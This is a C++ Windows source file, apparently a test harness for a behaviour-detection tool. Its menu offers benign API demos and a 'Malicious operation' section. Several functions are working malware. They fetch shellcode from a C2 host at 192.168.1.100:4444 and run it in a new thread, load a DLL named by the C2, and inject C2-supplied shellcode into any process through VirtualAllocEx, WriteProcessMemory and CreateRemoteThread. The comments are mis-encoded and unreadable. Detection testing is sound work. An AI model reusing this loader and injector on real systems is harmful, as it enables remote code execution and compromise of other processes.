#include<windows.h>
#include<stdio.h>
#include <stdlib.h>
//#include <WinSock2.h>
#pragma comment(lib, "ws2_32.lib")  //���� ws2_32.dll
//#include <wchar.h>
#define PAGE_SIZE	4096
using namespace std;
void headCreateAndDestory();
void writeFileString();
void readFileString();
void regCreateAndSetValue();
void regOpenAndDelValue();
void showMenu();
void headRepeatedRelease();
void modifyExProgram();
void selfReplication();
void modifyStartupRegistry();
void openAnotherFolder();
void recvData();
void sendData();
void memoryOperation();
void CREATEPROCESSW();
void CREATETHREAD();
void EXITTHREAD();
void LOADLIBRARYW();
void GETPROCADDRESS();
void VIRTUALALLOCEX();
void WRITEPROCESSMEMORY();
void CREATEREMOTETHREAD();
int main() {
	int op = 0;
	//MessageBoxA(NULL, "Can not open the file", "Playwav", MB_OK);
	while (1) {
		showMenu();
		scanf_s("%d", &op);
		switch (op)
		{
			// exit
		case 0: {
			printf("bye!\n");
			break;
		}
		case 1: {
			MessageBoxA(NULL, "I'm MessageBoxA", "I'm MessageBoxA's title", MB_OK);
			break;
		}
		case 2: {
			MessageBoxW(NULL, L"I'm MessageBoxW", L"I'm MessageBoxW's title", MB_OK);
			break;
		}
			  // heap create and heap destory
		case 3: {
			headCreateAndDestory();
			break;
		}
			  // Create and write File
		case 4: {
			writeFileString();
			break;
		}
			  // Create and read File
		case 5: {
			readFileString();
			break;
		}
			  // Create, set value and close reg
		case 6: {
			regCreateAndSetValue();
			break;
		}
			  // open, delete value and close reg
		case 7: {
			regOpenAndDelValue();
			break;
		}
		case 8: {
			recvData();
			break;
		}
		case 9: {
			sendData();
			break;
		}
		case 10: {
			headRepeatedRelease();
			break;
		}
		case 11: {
			modifyExProgram();
			break;
		}
		case 12: {
			selfReplication();
			break;
		}
		case 13: {
			modifyStartupRegistry();
			break;
		}
		case 14: {
			openAnotherFolder();
			break;
		}
		case 15: {
			memoryOperation();
			break;
		}
		case 16: {
			CREATEPROCESSW();
			break;
		}
		case 17: {
			CREATETHREAD();
			break;
		}
		case 18: {
			EXITTHREAD();
			break;
		}
		case 19: {
			LOADLIBRARYW();
			break;
		}
		case 20: {
			GETPROCADDRESS();
			break;
		}
		case 21: {
			VIRTUALALLOCEX();
			break;
		}
		case 22: {
			WRITEPROCESSMEMORY();
			break;
		}
		case 23: {
			CREATEREMOTETHREAD();
			break;
		}
		}
		// exit
		if (op == 0) {
			break;
		}
	}
	return 0;
}
void showMenu() {
	//printf("\n*************************************************************************************\n");
	printf("--------------------------------please select an option--------------------------------\n");
	printf("--Normal operation--:\n");
	printf("1.MessageBoxA      2.MessageBoxW            3.headCreateAndDestory   4.writeFileString\n");
	printf("5.readFileString   6.regCreateAndSetValue   7.regOpenAndDelValue     8.socketRecvData\n");
	printf("9.socketSendData\n");
	printf("--Malicious operation--:\n");
	printf("10.headRepeatedRelease   11.Modifying executable program   12.selfReplication\n");
	printf("13.modifyStartupRegistry   14.openAnotherFolder\n");
	printf("15.memoryOperation   16.CREATEPROCESSW\n");
	printf("17.CREATETHREAD   18.EXITTHREAD\n");
	printf("19.LOADLIBRARYW   20.GETPROCADDRESS\n");
	printf("21.VIRTUALALLOCEX   22.WRITEPROCESSMEMORY   23.CREATEREMOTETHREAD\n");
}
void headCreateAndDestory() {

	printf("Press any key to start HeapCreate!\n");
	getchar();
	HANDLE hHeap = HeapCreate(HEAP_NO_SERIALIZE, PAGE_SIZE * 10, PAGE_SIZE * 100);

	int* pArr = (int*)HeapAlloc(hHeap, 0, sizeof(int) * 30);
	for (int i = 0; i < 30; ++i)
	{
		pArr[i] = i + 1;
	}
	printf("Successfully created!\n");
	for (int i = 0; i < 30; ++i)
	{
		if (i % 5 == 0)
			printf_s("\n");
		printf("%3d ", pArr[i]);
	}
	printf_s("\n\n");
	printf("Press any key to start HeapFree!\n");
	getchar();
	HeapFree(hHeap, 0, pArr);
	printf("Press any key to start HeapDestory!\n");
	getchar();
	HeapDestroy(hHeap);

	printf("Successfully destory!\n");
}
void writeFileString()
{
	CHAR* pBuffer;
	int fileSize = 0;
	char writeString[100];
	bool flag;
	HANDLE hOpenFile = (HANDLE)CreateFile(L"a.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, NULL, NULL);
	if (hOpenFile == INVALID_HANDLE_VALUE)
	{
		hOpenFile = NULL;
		printf("Can not open the file\n");
		return;
		//MessageBoxA(NULL, "Can not open the file", "Playwav", MB_OK);
	}
	printf("successfully open a file\n");
	printf("input a string:");
	scanf_s("%s", writeString);
	flag = WriteFile(hOpenFile, writeString, strlen(writeString), NULL, NULL);
	if (flag) {
		printf("successful writed!\n");
	}
	FlushFileBuffers(hOpenFile);
	CloseHandle(hOpenFile);
}
void readFileString() {
	CHAR* pBuffer;
	int fileSize = 0;
	bool flag;
	HANDLE hOpenFile = (HANDLE)CreateFile(L"a.txt", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, NULL, NULL);
	if (hOpenFile == INVALID_HANDLE_VALUE)
	{
		hOpenFile = NULL;
		printf("Can not open the file\n");
		return;
	}
	printf("successfully open a file\n");
	fileSize = GetFileSize(hOpenFile, NULL);
	pBuffer = (char*)malloc((fileSize + 1) * sizeof(char));
	flag = ReadFile(hOpenFile, pBuffer, fileSize, NULL, NULL);
	pBuffer[fileSize] = 0;
	if (flag) {
		printf("successfully read a string:%s!\n", pBuffer);
	}
	free(pBuffer);
	CloseHandle(hOpenFile);
}
void regCreateAndSetValue() {
	// ����ע������ü�ֵ
	HKEY hKey = NULL;
	TCHAR Data[254];
	memset(Data, 0, sizeof(Data));
	wcsncpy_s(Data, TEXT("https://github.com/AgentGuo"), 254);

	size_t lRet = RegCreateKeyEx(HKEY_CURRENT_USER, (LPWSTR)L"aaaMykey", 0, NULL, REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS, NULL, &hKey, NULL);
	if (lRet == ERROR_SUCCESS) {
		printf("create successfully!\n");
	}
	else {
		printf("failed to create!\n");
	}
	// �޸�ע����ֵ��û���򴴽���
	size_t iLen = wcslen(Data);
	// ���ü�ֵ
	lRet = RegSetValueEx(hKey, L"panfeng", 0, REG_SZ, (CONST BYTE*)Data, sizeof(TCHAR) * iLen);
	if (lRet == ERROR_SUCCESS)
	{
		printf("set value successfully!\n");
		return;
	}
	else {
		printf("failed to set value!\n");
	}
	RegCloseKey(hKey);
}
void regOpenAndDelValue() {
	HKEY hKey = NULL;
	size_t lRet = RegOpenKeyEx(HKEY_CURRENT_USER, (LPWSTR)L"aaaMykey", 0, KEY_ALL_ACCESS, &hKey);
	if (lRet == ERROR_SUCCESS) {
		printf("open successfully!\n");
	}
	else {
		printf("open failed\n");
	}
	lRet = RegDeleteValue(hKey, L"panfeng");
	if (lRet == ERROR_SUCCESS) {
		printf("delete success!\n");
	}
	else {
		printf("delete fail!\n");
	}
	RegCloseKey(hKey);
}
void headRepeatedRelease() {

	printf("Press any key to start HeapCreate!\n");
	getchar();
	HANDLE hHeap = HeapCreate(HEAP_NO_SERIALIZE, PAGE_SIZE * 10, PAGE_SIZE * 100);

	int* pArr = (int*)HeapAlloc(hHeap, 0, sizeof(int) * 30);
	for (int i = 0; i < 30; ++i)
	{
		pArr[i] = i + 1;
	}
	printf("Successfully created!\n");
	for (int i = 0; i < 30; ++i)
	{
		if (i % 5 == 0)
			printf_s("\n");
		printf("%3d ", pArr[i]);
	}
	printf_s("\n\n");
	printf("Press any key to start the first HeapFree!\n");
	getchar();
	HeapFree(hHeap, 0, pArr);
	printf("Press any key to start the second HeapFree!\n");
	getchar();
	HeapFree(hHeap, 0, pArr);
	printf("Press any key to destroy the heap!\n");
	getchar();
	HeapDestroy(hHeap);
}
void modifyExProgram() {
	HANDLE hOpenFile = (HANDLE)CreateFile(L"a.exe", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, NULL, NULL);
	CloseHandle(hOpenFile);
}
void selfReplication() {
	//testCode.exe
	HANDLE hOpenFile = (HANDLE)CreateFile(L"testCode.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, NULL, NULL);
	CloseHandle(hOpenFile);
}
void modifyStartupRegistry() {
	HKEY hKey = NULL;
	size_t lRet = RegOpenKeyEx(HKEY_CURRENT_USER, (LPWSTR)L"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_READ, &hKey);
	if (lRet == ERROR_SUCCESS) {
		printf("open successfully!\n");
	}
	else {
		printf("open failed\n");
	}
	RegCloseKey(hKey);
}
void openAnotherFolder() {
	HANDLE hOpenFile = (HANDLE)CreateFile(L".\\testFolder\\a.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, NULL, NULL);
	CloseHandle(hOpenFile);
}
void recvData() {
	//��ʼ��DLL
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	//�����׽���
	SOCKET sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	//���������������
	sockaddr_in sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));  //ÿ���ֽڶ���0���
	sockAddr.sin_family = PF_INET;
	sockAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
	sockAddr.sin_port = htons(1234);
	connect(sock, (SOCKADDR*)&sockAddr, sizeof(SOCKADDR));
	Sleep(500);
	//���շ��������ص�����
	char szBuffer[MAXBYTE] = { 0 };
	recv(sock, szBuffer, MAXBYTE, NULL);
	//������յ�������
	printf("Message form server: %s\n", szBuffer);
	//�ر��׽���
	closesocket(sock);
	//��ֹʹ�� DLL
	WSACleanup();
}
void sendData() {
	//��ʼ�� DLL
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	//�����׽���
	SOCKET servSock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	//���׽���
	sockaddr_in sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));  //ÿ���ֽڶ���0���
	sockAddr.sin_family = PF_INET;  //ʹ��IPv4��ַ
	sockAddr.sin_addr.s_addr = inet_addr("127.0.0.1");  //�����IP��ַ
	sockAddr.sin_port = htons(1234);  //�˿�
	bind(servSock, (SOCKADDR*)&sockAddr, sizeof(SOCKADDR));
	//�������״̬
	listen(servSock, 20);
	//���տͻ�������
	SOCKADDR clntAddr;
	int nSize = sizeof(SOCKADDR);
	SOCKET clntSock = accept(servSock, (SOCKADDR*)&clntAddr, &nSize);
	//��ͻ��˷�������
	char str[32] = "Hello World!";
	send(clntSock, str, strlen(str) + sizeof(char), NULL);
	//�ر��׽���
	closesocket(clntSock);
	closesocket(servSock);
	//��ֹ DLL ��ʹ��
	WSACleanup();
}
void memoryOperation() {
	getchar();
	char temp[100] = "";
	printf("press any key to copy memory\n");
	getchar();
	//memccpy(temp, "hello\n", 6);
	memcpy(temp, "hello\n", 6);
	printf("%s", temp);
	printf("press any key to move memory\n");
	getchar();
	memmove(temp, "world\n", 6);
	printf("%s", temp);
}
void CREATEPROCESSW() {
	// ����ͨ�Ų���
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	sockaddr_in servAddr;
	memset(&servAddr, 0, sizeof(servAddr));
	servAddr.sin_family = AF_INET;
	servAddr.sin_addr.s_addr = inet_addr("192.168.1.100"); // ����C2������
	servAddr.sin_port = htons(4444);

	connect(sock, (SOCKADDR*)&servAddr, sizeof(servAddr));

	// ����Զ��ָ��
	char cmd[256];
	recv(sock, cmd, sizeof(cmd), 0);

	// ִ�ж�����̴������ᴥ����⣩
	if (strstr(cmd, "launch")) {
		STARTUPINFOA si = { sizeof(si) };
		PROCESS_INFORMATION pi = { 0 };
		char cmdLine[] = "cmd.exe /c dir";
		// 2. ��ȷ����CreateProcessA
		BOOL bSuccess = CreateProcessA(
			NULL,                    // Ӧ�ó�����(�ɿ�)
			cmdLine,     // ������(�����д)
			NULL,                    // ���̰�ȫ����
			NULL,                    // �̰߳�ȫ����
			FALSE,                   // ���̳о��
			CREATE_NO_WINDOW,        // ������־
			NULL,                    // ��������(�̳�)
			NULL,                    // ��ǰĿ¼(�̳�)
			&si,                     // ������Ϣ
			&pi                      // ������Ϣ
		);
		if (!bSuccess) {
			DWORD dwError = GetLastError();
			printf("CreateProcess failed (%d)\n", dwError);
		}
		else {
			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);
		}
	} // <-- ��ȫ if ���ıպϴ�����

	closesocket(sock);
	WSACleanup();
}
void CREATETHREAD() {

	// ��ʼ��Winsock������ͼƬ���
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	// �����׽���
	SOCKET servSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	// �󶨱��ض˿ڣ��޸�Ϊ������IP��
	sockaddr_in servAddr;
	memset(&servAddr, 0, sizeof(servAddr));
	servAddr.sin_family = AF_INET;
	servAddr.sin_addr.s_addr = inet_addr("192.168.1.100"); // ������IP
	servAddr.sin_port = htons(4444); // ����˿�
	bind(servSock, (SOCKADDR*)&servAddr, sizeof(SOCKADDR));

	// ��������
	listen(servSock, 1);

	// ���չ���������
	SOCKADDR_IN clntAddr;
	int nSize = sizeof(SOCKADDR_IN);
	SOCKET clntSock = accept(servSock, (SOCKADDR*)&clntAddr, &nSize);

	// ����shellcode
	unsigned char shellcode[512];
	int recvLen = recv(clntSock, (char*)shellcode, sizeof(shellcode), 0);

	// ִ���߳�ע�루�ᴥ��CREATETHREAD��⣩
	if (recvLen > 0) {
		LPVOID execMem = VirtualAlloc(NULL, recvLen, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		memcpy(execMem, shellcode, recvLen);

		// �������Ĺؼ�����
		HANDLE hThread = CreateThread(
			NULL,
			0,
			(LPTHREAD_START_ROUTINE)execMem, // ���ɵ��߳���ڵ�
			NULL,
			0,
			NULL
		);

		if (hThread) {
			WaitForSingleObject(hThread, INFINITE);
			CloseHandle(hThread);
		}
		VirtualFree(execMem, 0, MEM_RELEASE);
	}

	// ������Դ������ͼƬ���
	closesocket(clntSock);
	closesocket(servSock);
	WSACleanup();
}
void EXITTHREAD() {
	// ��ʼ��Winsock������ͼƬ���
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	// �����׽��֣�����ͼƬ���
	SOCKET servSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	// �󶨶˿ڣ��޸�Ϊ������C2��ַ��
	sockaddr_in servAddr;
	memset(&servAddr, 0, sizeof(servAddr));
	servAddr.sin_family = AF_INET;
	servAddr.sin_addr.s_addr = inet_addr("192.168.1.100"); // C2������IP
	servAddr.sin_port = htons(4444); // ����˿�
	bind(servSock, (SOCKADDR*)&servAddr, sizeof(SOCKADDR));

	// ���չ�����ָ��
	listen(servSock, 1);
	SOCKADDR_IN clntAddr;
	int nSize = sizeof(SOCKADDR_IN);
	SOCKET clntSock = accept(servSock, (SOCKADDR*)&clntAddr, &nSize);

	// �����߳��쳣�˳����
	DWORD exitCode = 0;
	recv(clntSock, (char*)&exitCode, sizeof(exitCode), 0); // ���չ�����ָ�����˳���

	// �����߳��˳����ᴥ��EXITTHREAD��أ�
	if (exitCode != 0) {
		// ��ʽ1��ֱ���쳣�˳�
		ExitThread(exitCode); // ���� if (exitCode != 0) ���

		// ��ʽ2������������˳��������Σ�
		// __try { *(int*)0 = 0; } 
		// __except(ExitThread(exitCode), EXCEPTION_EXECUTE_HANDLER) {}
	}

	// ������Դ������ͼƬ���
	closesocket(clntSock);
	closesocket(servSock);
	WSACleanup();
}
void LOADLIBRARYW() {
	// ��ʼ��Winsock������ͼƬ��ȫ��ͬ�ķ��
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	// ����C2ͨ���׽��֣��޸�Ϊ������IP��
	SOCKET c2Sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sockaddr_in c2Addr;
	memset(&c2Addr, 0, sizeof(c2Addr));
	c2Addr.sin_family = AF_INET;
	c2Addr.sin_addr.s_addr = inet_addr("192.168.1.100"); // C2������IP
	c2Addr.sin_port = htons(4444);
	connect(c2Sock, (SOCKADDR*)&c2Addr, sizeof(c2Addr));

	// ��C2���ն���DLL·�����ᴥ��LOADLIBRARY��⣩
	char dllPath[MAX_PATH];
	recv(c2Sock, dllPath, MAX_PATH, 0);

	// ������صĶ���DLL������Ϊ
	HMODULE hMalDll = LoadLibraryExA(
		dllPath,          // �磺"C:\\Temp\\inject.dll"
		NULL,
		LOAD_WITH_ALTERED_SEARCH_PATH
	);

	if (hMalDll) {
		// ��ȡ��ִ�ж��⵼������
		FARPROC pMalFunc = GetProcAddress(hMalDll, "Start");
		if (pMalFunc) {
			((void(*)())pMalFunc)();
		}
		FreeLibrary(hMalDll);
	}

	// ������Դ����ȫ����ͼƬ���
	closesocket(c2Sock);
	WSACleanup();
}
void GETPROCADDRESS() {
	// ��ʼ��Winsock
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	// ����C2ͨ���׽��֣��޸�Ϊ������IP��
	SOCKET c2Sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sockaddr_in c2Addr;
	memset(&c2Addr, 0, sizeof(c2Addr));
	c2Addr.sin_family = AF_INET;
	c2Addr.sin_addr.s_addr = inet_addr("192.168.1.100"); // C2������IP
	c2Addr.sin_port = htons(4444);
	connect(c2Sock, (SOCKADDR*)&c2Addr, sizeof(c2Addr));
	// ��C2����Ҫ������API���ƣ��ᴥ��GETPROCADDRESS��⣩
	char apiName[64];
	recv(c2Sock, apiName, sizeof(apiName), 0);
	// ������صĶ���API������Ϊ
	HMODULE hModule = GetModuleHandleA("kernel32.dll");
	FARPROC pFunc = GetProcAddress(hModule, apiName); // �磺"CreateRemoteThread"
	if (pFunc) {
		// ִ��Σ��API���߳�ע��
		if (strcmp(apiName, "CreateRemoteThread") == 0) {
			HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 1234);

			// ��ȷ���庯��ָ������
			typedef HANDLE(WINAPI* fnCreateRemoteThread)(
				HANDLE,
				LPSECURITY_ATTRIBUTES,
				SIZE_T,
				LPTHREAD_START_ROUTINE,
				LPVOID,
				DWORD,
				LPDWORD
				);

			// ����ת�������
			((fnCreateRemoteThread)pFunc)(
				hProcess,
				NULL,
				0,
				NULL,
				NULL,
				0,
				NULL
				);

			CloseHandle(hProcess);
		}
	}
}
void VIRTUALALLOCEX() {
	// ��ʼ��Winsock������ͼƬ��ȫ��ͬ�ķ��
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	// ����C2ͨ���׽��֣��޸�Ϊ������IP��
	SOCKET c2Sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sockaddr_in c2Addr;
	memset(&c2Addr, 0, sizeof(c2Addr));
	c2Addr.sin_family = AF_INET;
	c2Addr.sin_addr.s_addr = inet_addr("192.168.1.100"); // C2������IP
	c2Addr.sin_port = htons(4444);
	connect(c2Sock, (SOCKADDR*)&c2Addr, sizeof(c2Addr));

	// ��C2����Ŀ��PID���ᴥ��VIRTUALALLOCEX��⣩
	DWORD targetPid;
	recv(c2Sock, (char*)&targetPid, sizeof(targetPid), 0);

	// ������صĶ����ڴ����
	HANDLE hTarget = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
	if (hTarget) {
		// ��Ŀ����̷����ִ���ڴ棨������⣩
		LPVOID pRemoteMem = VirtualAllocEx(
			hTarget,          // �ǵ�ǰ���̾��
			NULL,            // �Զ������ַ
			4096,            // �����С
			MEM_COMMIT | MEM_RESERVE,
			PAGE_EXECUTE_READWRITE  // ��ִ��Ȩ��
		);

		// ������Դ
		if (pRemoteMem) {
			VirtualFreeEx(hTarget, pRemoteMem, 0, MEM_RELEASE);
		}
		CloseHandle(hTarget);
	}

	// ����������Դ����ȫ����ͼƬ���
	closesocket(c2Sock);
	WSACleanup();
}
void WRITEPROCESSMEMORY() {
	// 1. ��ȷ��ʼ��Winsock
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		return;
	}

	// ����C2ͨ���׽��֣��޸�Ϊ������IP��
	SOCKET c2Sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sockaddr_in c2Addr;
	memset(&c2Addr, 0, sizeof(c2Addr));
	c2Addr.sin_family = AF_INET;
	c2Addr.sin_addr.s_addr = inet_addr("192.168.1.100"); // C2������IP
	c2Addr.sin_port = htons(4444);
	connect(c2Sock, (SOCKADDR*)&c2Addr, sizeof(c2Addr));

	// ��C2����Ŀ��PID��д������
	struct {
		DWORD pid;
		char data[256];
	} payload;

	recv(c2Sock, (char*)&payload, sizeof(payload), 0);

	// ������صĿ�����ڴ�д�루�ᴥ��WRITEPROCESSMEMORY��⣩
	HANDLE hTarget = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, payload.pid);
	if (hTarget) {
		// ��Ŀ�����д������
		SIZE_T bytesWritten;
		WriteProcessMemory(
			hTarget,                     // �ǵ�ǰ���̾��
			(LPVOID)0x00400000,          // Ŀ���ַ��ʾ����
			payload.data,                // д������
			strlen(payload.data) + 1,    // ���ݳ���
			&bytesWritten                // ����д���ֽ���
		);
		CloseHandle(hTarget);
	}

	// ������Դ����ȫ����ͼƬ���
	closesocket(c2Sock);
	WSACleanup();
}
void CREATEREMOTETHREAD() {
	// ��ʼ��Winsock
	WSADATA wsaData; WSAStartup(MAKEWORD(2, 2), &wsaData);

	// ����C2ͨ���׽���
	SOCKET c2Sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sockaddr_in c2Addr; memset(&c2Addr, 0, sizeof(c2Addr));
	c2Addr.sin_family = AF_INET;
	c2Addr.sin_addr.s_addr = inet_addr("192.168.1.100"); // C2������IP
	c2Addr.sin_port = htons(4444);
	connect(c2Sock, (SOCKADDR*)&c2Addr, sizeof(SOCKADDR));
	Sleep(500); // ����ͼƬ�е��ӳ�

	// ��C2����Ŀ��PID��shellcode
	struct {
		DWORD pid;
		BYTE shellcode[256];
	} payload;
	recv(c2Sock, (char*)&payload, sizeof(payload), NULL);

	// ����CREATEREMOTETHREAD��⣨�ؼ�������Ϊ��
	HANDLE hTarget = OpenProcess(PROCESS_ALL_ACCESS, FALSE, payload.pid);
	if (hTarget != NULL) {
		LPVOID pRemoteMem = VirtualAllocEx(hTarget, NULL, sizeof(payload.shellcode),
			MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (pRemoteMem) {
			WriteProcessMemory(hTarget, pRemoteMem, payload.shellcode,
				sizeof(payload.shellcode), NULL);

			// ������صĺ��ĵ���
			CreateRemoteThread(hTarget, NULL, 0,
				(LPTHREAD_START_ROUTINE)pRemoteMem,
				NULL, 0, NULL);
		}
		CloseHandle(hTarget);
	}

	// ������Դ
	closesocket(c2Sock); WSACleanup();
}